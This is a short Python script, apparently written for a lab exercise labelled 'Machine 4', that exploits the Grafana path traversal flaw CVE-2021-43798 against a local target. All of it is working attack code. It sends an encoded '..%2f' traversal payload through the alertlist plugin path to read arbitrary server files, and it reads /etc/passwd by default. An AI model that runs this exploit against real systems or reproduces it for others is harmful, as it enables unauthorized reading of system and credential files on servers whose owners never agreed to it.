#!/usr/bin/env python3
"""
Machine 4 - Grafana CVE-2021-43798 Path Traversal Exploit
Target: http://localhost:9044
Vulnerability: Arbitrary file read via path traversal
"""

import requests
import sys

TARGET = "http://localhost:9044"

def exploit(filepath):
    """Exploit Grafana path traversal to read arbitrary files"""
    # CVE-2021-43798 payload
    payload = f"/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{filepath}"
    
    try:
        response = requests.get(f"{TARGET}{payload}", timeout=10)
        if response.status_code == 200:
            return response.text
        else:
            return f"Error: HTTP {response.status_code}"
    except requests.RequestException as e:
        return f"Error: {e}"

def main():
    print("[*] Machine 4 - Grafana CVE-2021-43798 Path Traversal")
    print(f"[*] Target: {TARGET}")
    print("-" * 50)
    
    if len(sys.argv) > 1:
        filepath = sys.argv[1]
    else:
        filepath = "etc/passwd"
    
    print(f"[+] Reading file: /{filepath}")
    print("-" * 50)
    
    result = exploit(filepath)
    print(result)

if __name__ == "__main__":
    main()
